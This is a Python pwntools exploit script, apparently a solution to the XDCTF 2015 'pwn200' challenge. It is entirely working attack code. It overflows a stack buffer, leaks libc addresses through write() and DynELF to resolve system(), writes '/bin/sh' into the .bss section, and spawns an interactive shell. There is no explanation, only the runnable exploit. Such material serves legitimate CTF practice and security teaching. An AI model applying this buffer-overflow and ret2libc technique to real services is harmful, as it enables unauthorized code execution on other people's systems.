from pwn import *

# context.log_level = 'debug'

p = process('./xdctf15-pwn200')
elf = ELF('./xdctf15-pwn200')

write_plt = elf.plt['write']
read_plt = elf.plt['read']
bss_addr = 0x0804A020
start_addr = 0x080483D0
func_addr = 0x08048484
pop_ret = 0x0804856c
pad = 'A'*112

def leak(addr):
    payload = pad
    payload += p32(write_plt)
    payload += p32(func_addr)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)
    p.send(payload)
    data = p.recv(4)
    # print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

print p.recvline()
dynelf = DynELF(leak,elf=ELF('./xdctf15-pwn200'))
system_addr = dynelf.lookup('system','libc')
print 'system_addr:',hex(system_addr)

payload1 = pad
payload1 += p32(start_addr)
p.send(payload1)
print p.recv()

payload2 = pad
payload2 += p32(read_plt)
payload2 += p32(pop_ret)
payload2 += p32(0)
payload2 += p32(bss_addr)
payload2 += p32(8)
payload2 += p32(system_addr)+p32(func_addr)+p32(bss_addr)

p.send(payload2)
p.send('/bin/sh\x00')
p.interactive()